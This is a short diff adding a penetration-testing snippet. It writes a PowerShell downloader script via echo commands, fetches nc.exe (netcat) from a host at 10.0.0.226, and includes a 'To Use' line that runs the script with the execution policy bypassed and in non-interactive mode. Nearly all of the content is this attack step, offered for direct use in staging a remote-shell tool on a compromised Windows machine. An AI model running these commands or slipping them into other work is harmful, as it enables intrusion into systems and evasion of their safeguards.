@@ -1,0 +1,21 @@
+echo $webclient = New-Object System.net.WebClient >wget.ps1
+echo $url = "http://10.0.0.226/nc.exe" >> wget.ps1
+echo $file = "nc.exe" >> wget.ps1
+echo $webclient.DownloadFile($url,$file) >> wget.ps1
+
+
+#################
+
+To Use:
+
+powershell.exe -ExecutionPolicy Bypass -Nologo -NonInteractive -Noprofile -File wget.ps1
+
+
+#################
+
+
+
+
+
+
+
